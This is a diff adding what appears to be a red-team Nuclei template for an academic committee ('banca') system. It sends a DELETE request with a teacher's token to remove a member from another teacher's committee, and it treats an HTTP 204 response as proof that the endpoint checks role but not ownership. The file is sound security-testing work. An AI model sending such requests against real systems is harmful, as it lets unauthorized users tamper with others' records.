@@ -1,0 +1,17 @@
+id: rt05-remove-membro-banca-alheia
+info:
+  name: "TEACHER sem vinculo expulsa membro de banca alheia (teacher2 da banca 2) - removeUserFromBanca sem ownership"
+  author: redteam-sisdef
+  severity: medium
+  description: "DELETE /banca/:bancaId/usuarios/:userId tem so checkRole; service nao confere orientador/dono."
+  tags: redteam,authz,integrity
+http:
+  - raw:
+      - |
+        DELETE /banca/2/usuarios/3 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{TOKEN_TEACHER}}
+    matchers:
+      - type: status
+        status:
+          - 204
